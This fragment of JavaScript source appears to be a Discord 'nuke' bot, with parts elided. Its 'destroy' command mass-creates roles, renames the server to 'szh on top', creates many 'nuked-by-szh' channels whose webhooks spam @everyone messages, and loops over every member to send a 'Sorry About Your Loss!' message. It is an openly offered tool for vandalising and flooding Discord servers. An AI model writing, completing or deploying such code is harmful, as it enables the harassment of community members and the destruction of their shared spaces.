...
Nuked By SZH. Sorry About Your Loss!
    `;
    message.guild.members.cache.forEach(async member => {
      try {
  ...
  if (command === 'destroy') {
    ...
    for (let i = 0; i < numRoles; i++) {
      try {
        ...
        console.log(`Role szhontop${i + 1} has been created`);
      } catch (error) {
        console.error(`Failed to create role szhontop${i + 1}:`, error);
      }
    }

    // Rename the server to "szh on top"
    try {
      await message.guild.setName('szh on top');
      console.log('Server renamed to "szh on top"');
    } catch (error) {
    ...
    for (let i = 0; i < numChannels; i++) {
      try {
        const newChannel = await message.guild.channels.create(`nuked-by-szh-${i + 1}`, { type: 'GUILD_TEXT' });
        const webhook = await newChannel.createWebhook('SZH Webhook');
        for (let j = 0; j < channelMessages.length; j++) {
          await webhook.send({ content: `@everyone ${channelMessages[j]}` });
        }
        console.log(`Channel nuked-by-szh-${i + 1} and messages sent`);
      } catch (error) {
